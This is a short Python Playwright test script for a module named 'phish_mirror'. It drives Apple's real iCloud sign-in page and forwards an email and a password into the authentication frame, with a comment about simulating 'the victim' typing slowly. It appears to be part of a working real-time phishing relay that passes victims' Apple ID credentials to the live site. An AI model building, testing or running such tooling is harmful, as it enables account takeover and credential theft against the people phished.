#!/usr/bin/env python3
"""End-to-end test of the fixed forward_email/forward_password with a realistic delay."""
from playwright.sync_api import sync_playwright
import phish_mirror as m

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)
    ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    apple = ctx.new_page()
    frame = m.open_icloud_sign_in(apple)
    frame = m.apple_auth_frame(apple) or frame

    ok1 = m.forward_email(apple, frame, 'test.example.appleid.com')
    print('forward_email ->', ok1)
    frame = m.apple_auth_frame(apple) or frame

    # simulate the victim taking their time typing the password
    apple.wait_for_timeout(15000)

    ok2 = m.forward_password(apple, frame, 'hunter2secret')
    print('forward_password ->', ok2)
    frame = m.apple_auth_frame(apple) or frame

    apple.wait_for_timeout(3000)
    print('APPLE STATE:', m.probe_apple_frame(frame))
    b.close()
